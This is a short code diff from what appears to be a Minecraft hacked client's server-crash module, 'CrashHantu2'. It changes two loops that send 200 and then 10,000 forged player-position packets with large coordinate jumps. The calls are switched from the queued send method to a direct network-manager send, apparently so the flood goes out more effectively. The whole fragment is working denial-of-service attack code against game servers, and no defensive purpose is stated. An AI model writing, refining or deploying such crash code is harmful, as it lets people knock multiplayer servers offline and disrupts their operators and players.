@@ -30,12 +30,12 @@ public class CrashHantu2 extends Crash {
                     int i3;
                     for (i3 = 0; i3 < 200; ++i3) {
                         d1 = i3 * 9;
-                        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y + d1, z, false));
+                        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(x, y + d1, z, false));
                     }
 
                     for (i3 = 0; i3 < 10000; ++i3) {
                         double d2 = i3 * 9;
-                        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y + d1, z + d2, false));
+                        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(x, y + d1, z + d2, false));
                     }
                 }
             } catch (Exception ignored) {
